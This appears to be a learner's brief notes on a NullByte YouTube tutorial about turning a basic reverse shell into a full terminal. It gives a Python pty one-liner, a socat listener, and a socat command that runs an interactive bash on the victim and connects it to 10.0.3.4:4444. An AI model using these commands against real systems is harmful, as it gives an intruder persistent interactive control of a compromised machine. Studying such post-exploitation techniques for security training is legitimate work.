# Upgrade a Dumb Reverse Shell into a Fully Functional Terminal Tutorial
Type : #t/YouTube
Time Created : 2022-06-06 19:34
Last Modified : 2022-06-06 19:34
Subjects: #s/Cybersecurity 
Progress: #p/🟡 
URL: https://www.youtube.com/watch?v=vOEO_6xfsdo
Publisher: #psh/NullByte
Priority: #i/🟧 

## Python PTY
First you have to create a reverse shell, after that you need to look if there's a python in the victim's computer you need to type `python -c 'import pty; pty.spawn("/bin/sh")'`
this will recreate the shell to be more fictional.
[PTY Documentations](https://docs.python.org/3/library/pty.html)

## Socat
like Netcat on steroids.
Listening :
```bash 
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
Lunching:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
